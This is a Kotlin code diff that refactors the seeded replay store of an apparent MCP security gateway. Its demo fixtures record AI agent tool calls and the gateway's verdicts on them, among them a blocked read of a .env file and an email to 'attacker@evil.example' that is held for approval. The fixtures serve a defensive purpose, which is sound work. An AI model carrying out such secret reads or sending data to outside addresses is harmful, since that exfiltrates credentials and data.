@@ -1,16 +1,20 @@
 package kr.guardmcp.controlplane.domain
 
 import org.springframework.stereotype.Component
-import java.security.MessageDigest
 import java.time.Instant
 import java.util.UUID
 
 /**
- * In-memory Replay data source (GMCP-28). Nodes are pre-assembled and stored as first-class
- * records at seed time, rather than derived per-request from a raw event log: `GET /events/{id}`,
+ * Seeded Replay data source (GMCP-28). Nodes are pre-assembled and stored as first-class records
+ * at seed time, rather than derived per-request from a raw event log: `GET /events/{id}`,
  * deep-link anchoring, and the `ts`/`eventId` tie-break all need a stable per-node identity, and
  * the hash chain must be computed once, deterministically, over the exact payload it later
  * verifies against.
+ *
+ * These four sessions are demo fixtures, not history. Sessions from real runs are projected from
+ * ingested audit events by [LiveReplaySource]; [ReplayTimelines] serves both. The seeded ones stay
+ * because two of them cannot be produced by running anything: the broken-chain session exists to
+ * show a tamper being detected, and the 1200-node session exists to exercise pagination.
  */
 @Component
 class ReplayStore {
@@ -40,7 +44,7 @@ class ReplayStore {
 
     fun node(eventId: UUID): Pair<UUID, TimelineNode>? = nodeIndex[eventId]
 
-    fun chainResult(sessionId: UUID): ChainResult = chainResults.getValue(sessionId)
+    fun chainResult(sessionId: UUID): ChainResult? = chainResults[sessionId]
 
     fun eventCount(sessionId: UUID): Int = nodesBySession[sessionId]?.size ?: 0
 
@@ -72,7 +76,7 @@ class ReplayStore {
     private fun register(sessionId: UUID, nodes: List<TimelineNode>) {
         val sorted = nodes.sortedWith(compareBy({ it.ts }, { it.eventId.toString() }))
         nodesBySession[sessionId] = sorted
-        chainResults[sessionId] = validateChain(sorted)
+        chainResults[sessionId] = ReplayChain.validate(sorted)
         sorted.forEach { nodeIndex[it.eventId] = sessionId to it }
     }
 
@@ -92,7 +96,7 @@ class ReplayStore {
                 TimelineNode(
                     nextEventId(), TimelineNodeType.TOOL_CALL, start.plusMillis(590),
                     "read_file(\".env\")", toolName = "read_file", direction = ToolCallDirection.REQ,
-                    argsDigest = "sha256:" + sha256("read_file:.env"),
+                    argsDigest = "sha256:" + ReplayChain.sha256("read_file:.env"),
                 ),
                 chain.verdictNode(
                     eventId = nextEventId(), ts = start.plusMillis(628), summary = "차단",
@@ -123,7 +127,7 @@ class ReplayStore {
                 TimelineNode(
                     nextEventId(), TimelineNodeType.TOOL_CALL, start.plusMillis(150),
                     "lookup_customer(\"홍길동\")", toolName = "lookup_customer", direction = ToolCallDirection.REQ,
-                    argsDigest = "sha256:" + sha256("lookup_customer:홍길동"),
+                    argsDigest = "sha256:" + ReplayChain.sha256("lookup_customer:홍길동"),
                 ),
                 chain.verdictNode(
                     eventId = nextEventId(), ts = start.plusMillis(190), summary = "경고 · 마스킹 후 통과",
@@ -150,7 +154,7 @@ class ReplayStore {
                 TimelineNode(
                     nextEventId(), TimelineNodeType.TOOL_CALL, start.plusMillis(100),
                     "list_dir(\"/workspace\")", toolName = "list_dir", direction = ToolCallDirection.REQ,
-                    argsDigest = "sha256:" + sha256("list_dir:/workspace"),
+                    argsDigest = "sha256:" + ReplayChain.sha256("list_dir:/workspace"),
                 ),
                 chain.verdictNode(
                     eventId = nextEventId(), ts = start.plusMillis(140), summary = "허용",
@@ -162,7 +166,7 @@ class ReplayStore {
                 TimelineNode(
                     nextEventId(), TimelineNodeType.TOOL_CALL, start.plusMillis(240),
                     "send_email(\"attacker@evil.example\")", toolName = "send_email", direction = ToolCallDirection.REQ,
-                    argsDigest = "sha256:" + sha256("send_email:attacker"),
+                    argsDigest = "sha256:" + ReplayChain.sha256("send_email:attacker"),
                 ),
                 chain.verdictNode(
                     eventId = nextEventId(), ts = start.plusMillis(280), summary = "승인 대기",
@@ -192,7 +196,7 @@ class ReplayStore {
             nodes += TimelineNode(
                 nextEventId(), TimelineNodeType.TOOL_CALL, ts, "large_scan_tool(#$round)",
                 toolName = "large_scan_tool", direction = ToolCallDirection.REQ,
-                argsDigest = "sha256:" + sha256("large_scan_tool:$round"),
+                argsDigest = "sha256:" + ReplayChain.sha256("large_scan_tool:$round"),
             )
             ts = ts.plusMillis(10)
             nodes += chain.verdictNode(
@@ -207,77 +211,7 @@ class ReplayStore {
         register(sessionId, nodes)
     }
 
-    /** Recomputes and checks the hash chain independently of however the nodes were built. */
-    private fun validateChain(nodes: List<TimelineNode>): ChainResult {
-        var expectedPrevHash = GENESIS_HASH
-        for (node in nodes) {
-            if (node.type != TimelineNodeType.VERDICT) continue
-            val detail = requireNotNull(node.detail) { "VERDICT node ${node.eventId} is missing its detail" }
-            if (detail.prevHash != expectedPrevHash) return ChainResult(ChainStatus.BROKEN, node.eventId)
-            val recomputed = sha256(
-                chainPayload(
-                    node.eventId,
-                    requireNotNull(node.verdict),
-                    requireNotNull(node.riskScore),
-                    detail.matchedPolicyIds,
-                    detail.detections,
-                    detail.maskDiffRef,
-                    expectedPrevHash,
-                ),
-            )
-            if (recomputed != detail.hash) return ChainResult(ChainStatus.BROKEN, node.eventId)
-            expectedPrevHash = detail.hash
-        }
-        return ChainResult(ChainStatus.VALID, null)
-    }
-
-    /** Builds VERDICT nodes for one session, chaining each `hash` to the previous verdict's. */
-    private inner class ChainBuilder {
-        private var prevHash = GENESIS_HASH
-
-        fun verdictNode(
-            eventId: UUID,
-            ts: Instant,
-            summary: String,
-            verdict: Verdict,
-            riskScore: Int,
-            matchedPolicyIds: List<String>,
-            detections: List<Detection>,
-            corrupt: Boolean = false,
-        ): TimelineNode {
-            val maskDiffRef = "/api/v1/events/$eventId/mask-diff"
-            val correctHash = sha256(
-                chainPayload(eventId, verdict, riskScore, matchedPolicyIds, detections, maskDiffRef, prevHash),
-            )
-            val storedHash = if (corrupt) "0" + correctHash.drop(1) else correctHash
-            val detail = VerdictDetail(matchedPolicyIds, detections, maskDiffRef, storedHash, prevHash)
-            prevHash = correctHash
-            return TimelineNode(eventId, TimelineNodeType.VERDICT, ts, summary, verdict = verdict, riskScore = riskScore, detail = detail)
-        }
-    }
-
     companion object {
-        private const val GENESIS_HASH = ""
         private const val LARGE_SESSION_ROUNDS = 240
-
-        private fun chainPayload(
-            eventId: UUID,
-            verdict: Verdict,
-            riskScore: Int,
-            matchedPolicyIds: List<String>,
-            detections: List<Detection>,
-            maskDiffRef: String,
-            prevHash: String,
-        ): String {
-            val detectionsPart = detections.joinToString(";") {
-                "${it.type}:${it.subtype}:${it.span.start}-${it.span.end}:${it.confidence}:${it.maskedAs}"
-            }
-            return "$prevHash|$eventId|${verdict.wire}|$riskScore|${matchedPolicyIds.joinToString(",")}|$maskDiffRef|$detectionsPart"
-        }
-
-        private fun sha256(input: String): String {
-            val bytes = MessageDigest.getInstance("SHA-256").digest(input.toByteArray(Charsets.UTF_8))
-            return bytes.joinToString("") { "%02x".format(it) }
-        }
     }
 }
